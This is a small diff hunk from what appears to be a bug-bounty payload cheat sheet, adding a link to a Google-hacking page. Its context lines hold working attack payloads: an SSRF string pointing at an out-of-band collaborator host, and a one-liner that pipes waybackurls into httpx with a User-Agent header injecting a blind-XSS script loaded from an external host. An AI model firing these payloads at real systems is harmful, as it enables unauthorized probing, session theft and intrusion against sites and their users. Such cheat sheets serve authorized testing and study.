@@ -681,7 +681,7 @@ SSRF +441134960000;phone-context=http://burocoaborator.net
 
 cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"
 
-
+https://seckrd.com/google-hacking.php
 
 
 
